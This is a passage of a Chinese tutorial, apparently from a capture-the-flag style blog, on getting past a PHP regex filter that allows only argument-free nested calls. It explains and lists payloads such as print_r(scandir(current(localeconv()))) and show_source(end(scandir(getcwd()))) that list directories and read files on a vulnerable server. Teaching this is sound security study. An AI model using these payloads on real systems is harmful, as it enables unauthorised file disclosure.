data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;正则部分&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[^\W]+\((?R)?\)/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;\W 匹配所有数字、字母、下划线，+ 表示出现的次数 &amp;gt;=1，后面是一对括号 ()，里面的 (?R)? 表示递归整个匹配模式。整个就是匹配像 system () 这种格式，里面可以无限嵌套如：print_r (exec ())，但是里面不能有参数。&lt;/p&gt;
+&lt;h4 id=&#34;读取当前目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取当前目录&#34;&gt;#&lt;/a&gt; 读取当前目录&lt;/h4&gt;
+&lt;h5 id=&#34;方法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一：&lt;/h5&gt;
+&lt;p&gt;print_r ()	打印函数&lt;br /&gt;
+ scandir ()	读取目录&lt;br /&gt;
+ current ()	返回数组中的单元，默认第一个	也可以使用 pos 效果一样&lt;br /&gt;
+ localeconv ()	查找美国本地的数字格式化信息&lt;/p&gt;
+&lt;p&gt;localeconv () 函数会返回以下数组元素：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;[decimal_point] - 小数点字符	(利用的是返回的这个点.)&lt;/p&gt;
+&lt;p&gt;// 下面不重要&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[thousands_sep] - 千位分隔符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[int_curr_symbol] - 货币符号 （例如：USD）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[currency_symbol] - 货币符号 （例如：$）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[mon_decimal_point] - 货币小数点字符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[mon_thousands_sep] - 货币千位分隔符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[positive_sign] - 正值字符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[negative_sign] - 负值字符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[int_frac_digits] - 国际通用小数位&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[frac_digits] - 本地通用小数位&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[p_sign_posn] - 格式化选项：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;0 - 把数量和货币符号写在圆括号内&lt;/li&gt;
+&lt;li&gt;1 - 在数量和货币符号之前加上 + 号&lt;/li&gt;
+&lt;li&gt;2 - 在数量和货币符号之后加上 + 号&lt;/li&gt;
+&lt;li&gt;3 - 直接在货币符号之前加上 + 号&lt;/li&gt;
+&lt;li&gt;4 - 直接在货币符号之后加上 + 号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[n_sign_posn] - 格式化选项：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;0 - 把数量和货币符号写在圆括号内&lt;/li&gt;
+&lt;li&gt;1 - 在数量和货币符号之前加上 - 号&lt;/li&gt;
+&lt;li&gt;2 - 在数量和货币符号之后加上 - 号&lt;/li&gt;
+&lt;li&gt;3 - 直接在货币符号之前加上 - 号&lt;/li&gt;
+&lt;li&gt;4 - 直接在货币符号之后加上 - 号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;[mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;scandir (.) 可以用来扫描当前目录的文件，而 current (localeconv ()) 返回.，组合起来&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;localeconv&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;就可以读取当前目录&lt;/p&gt;
+&lt;h5 id=&#34;方法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二：&lt;/h5&gt;
+&lt;p&gt;getcwd ()	获取当前绝对路径&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;也可以读取当前目录&lt;/p&gt;
+&lt;h5 id=&#34;方法三&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法三&#34;&gt;#&lt;/a&gt; 方法三：&lt;/h5&gt;
+&lt;p&gt;time ()	返回当前时间的 Unix 时间戳&lt;br /&gt;
+ crypt ()	返回使用 DES、Blowfish 或 MD5 算法加密的字符串。&lt;br /&gt;
+hebrevc ()	反向显示希伯来字符，并把新行（\n）转换为 &amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;p&gt;由于 crypt (time ()) 生成的。都在字符串末尾，所以要用 hebrevc () 把。变成第一位&lt;/p&gt;
+&lt;p&gt;hebrevc (crypt (time ())) 可以随机生成一个 hash 值，第一个字符随机是 &lt;code&gt;$&lt;/code&gt; (大概率) 或者  &lt;code&gt;&amp;quot;.&amp;quot;&lt;/code&gt; (小概率)&lt;/p&gt;
+&lt;p&gt;ord ()	返回字符串中的第一个字符的 ascii 值&lt;br /&gt;
+ chr ()	ascii 码转换成字符串&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hebrevc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;由于 hebrevc (crypt (time ())) 第一个字符可能是 $ 或.，所以要多刷新几次&lt;/p&gt;
+&lt;p&gt;同理&lt;/p&gt;
+&lt;p&gt;strrev (crypt (serialize (array ()))) 也可以得到.&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strrev&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;读取当前目录文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取当前目录文件&#34;&gt;#&lt;/a&gt; 读取当前目录文件&lt;/h4&gt;
+&lt;p&gt;读取文件的函数&lt;/p&gt;
+&lt;p&gt;show_source&lt;br /&gt;
+readfile&lt;br /&gt;
+highllight_file&lt;br /&gt;
+file_get_content&lt;br /&gt;
+readgzfile&lt;br /&gt;
+file 等&lt;/p&gt;
+&lt;h5 id=&#34;读取最后一个文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取最后一个文件&#34;&gt;#&lt;/a&gt; 读取最后一个文件&lt;/h5&gt;
+&lt;p&gt;end ()	将数字内部的指针指向最后一个单元&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;array_reverse	将数组逆序&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_reverse&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;读取倒数第二个文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取倒数第二个文件&#34;&gt;#&lt;/a&gt; 读取倒数第二个文件&lt;/h5&gt;
+&lt;p&gt;next	将数组的指针后移一位&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_reverse&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;读取上一级文件目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取上一级文件目录&#34;&gt;#&lt;/a&gt; 读取上一级文件目录&lt;/h4&gt;
+&lt;p&gt;dirname	返回路径中的目录部分，dirname (&#39;/var/www/html&#39;) 返回 /var/www&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;chdir	改变当前目录&lt;/p&gt;
+&lt;p&gt;scandir (getcwd ()) 出现的数组第二个就是 &amp;quot;..&amp;quot;，所以可以用 next () 获取&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;或者&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hebrevc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;读取其他目录的文件都与这个类似&lt;/p&gt;
+&lt;h4 id=&#34;读取根目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#读取根目录&#34;&gt;#&lt;/a&gt; 读取根目录&lt;/h4&gt;
+&lt;p&gt;strrev (crypt (serialize (array ()))) 也有几率得到 /&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strrev&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;随机读取文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#随机读取文件&#34;&gt;#&lt;/a&gt; 随机读取文件&lt;/h4&gt;
+&lt;p&gt;array_flip	将数组键和值交换&lt;br /&gt;
+ array_rand	随机选取数组的键&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_rand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;tip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tip&#34;&gt;#&lt;/a&gt; tip&lt;/h4&gt;
+&lt;p&gt;上述方法不唯一，可以自行构造，使用其他方法来达到效果&lt;/p&gt;
+</content>
